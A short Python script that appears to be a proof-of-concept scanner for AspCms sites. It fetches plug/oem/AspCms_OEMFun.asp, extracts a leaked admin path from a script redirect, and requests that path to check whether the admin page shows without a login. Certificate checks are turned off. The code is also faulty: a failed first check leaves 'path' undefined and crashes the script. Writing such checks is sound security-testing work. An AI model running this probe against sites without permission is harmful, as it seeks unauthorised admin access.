import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"plug/oem/AspCms_OEMFun.asp"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "<script>alert" in response.text and "top.location.href=" in response.text:
		path=re.findall('\'\/(.*?)\'',response.text)[0]
		r0=True
	else:
		r0=False
	url=baseurl+f"{path}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "username" in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
